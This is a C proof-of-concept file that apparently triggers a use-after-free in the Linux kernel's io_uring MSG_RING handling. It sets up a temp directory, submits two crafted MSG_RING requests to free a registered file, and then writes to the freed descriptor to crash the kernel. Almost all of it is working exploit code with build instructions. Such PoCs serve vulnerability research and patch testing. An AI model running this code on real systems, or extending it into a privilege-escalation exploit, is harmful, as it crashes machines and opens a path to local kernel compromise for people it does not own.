// gcc poc.c -o poc -static -no-pie -s -luring \
//     -L ./liburing/ -I ./liburing/include

#define _GNU_SOURCE

#include <fcntl.h>
#include <linux/kcmp.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <syscall.h>
#include <unistd.h>

#include "liburing.h"

#define COLOR_GREEN "\033[32m"
#define COLOR_RED "\033[31m"
#define COLOR_YELLOW "\033[33m"
#define COLOR_DEFAULT "\033[0m"

#define logd(fmt, ...)                                                         \
    dprintf(2, "[*] %s:%d " fmt "\n", __FILE__, __LINE__, ##__VA_ARGS__)
#define logi(fmt, ...)                                                         \
    dprintf(2, COLOR_GREEN "[+] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__,      \
            __LINE__, ##__VA_ARGS__)
#define logw(fmt, ...)                                                         \
    dprintf(2, COLOR_YELLOW "[!] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__,     \
            __LINE__, ##__VA_ARGS__)
#define loge(fmt, ...)                                                         \
    dprintf(2, COLOR_RED "[-] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__,        \
            __LINE__, ##__VA_ARGS__)
#define die(fmt, ...)                                                          \
    do {                                                                       \
        loge(fmt, ##__VA_ARGS__);                                              \
        loge("Exit at line %d", __LINE__);                                     \
        exit(1);                                                               \
    } while (0)

#define TEMP_WORKDIR "/tmp/exp_dir"
#define TEMP_VICTIM_FILE "x"

void prepare_workdir() {
    logd("perpare the environment ...");
    char *cmdline;
    asprintf(&cmdline, "rm -rf %s && mkdir -p %s && touch '%s/%s'",
             TEMP_WORKDIR, TEMP_WORKDIR, TEMP_WORKDIR, TEMP_VICTIM_FILE);
    if (system(cmdline) != 0) {
        die("create temp workdir: %m");
    }

    if (chmod(TEMP_WORKDIR, 0777)) {
        die("chmod: %m");
    }

    if (chdir(TEMP_WORKDIR)) {
        die("chdir: %m");
    }
    free(cmdline);
}

int trigger_fd_uaf(int fd) {
#ifndef REQ_F_FIXED_FILE
#define REQ_F_FIXED_FILE 1
#endif
    struct io_uring ring;
    struct io_uring_sqe *sqe;

    io_uring_queue_init(64, &ring, 0);
    io_uring_register_files(&ring, &fd, 1);

    for (int i = 0; i < 2; i++) {
        sqe = io_uring_get_sqe(&ring);
        sqe->opcode = IORING_OP_MSG_RING;
        sqe->flags = REQ_F_FIXED_FILE;
        sqe->fd = 0;
        io_uring_submit(&ring);
    }

    // init_task_work(&file->f_u.fu_rcuhead, ____fput);
    logd("wait task ____fput() to free the struct file ...");
    usleep(500 * 1000);

    return 0;
}

int main(void) {
    prepare_workdir();

    int vuln_fd = open(TEMP_VICTIM_FILE, O_WRONLY);
    logd("vuln_fd: %d", vuln_fd);
    if (vuln_fd < 0) {
        die("open: %m");
    }

    trigger_fd_uaf(vuln_fd);

    logw("refcount=0, CRASH");
    write(vuln_fd, "AAAA", 4);
    loge("not crash ?");

    return 0;
}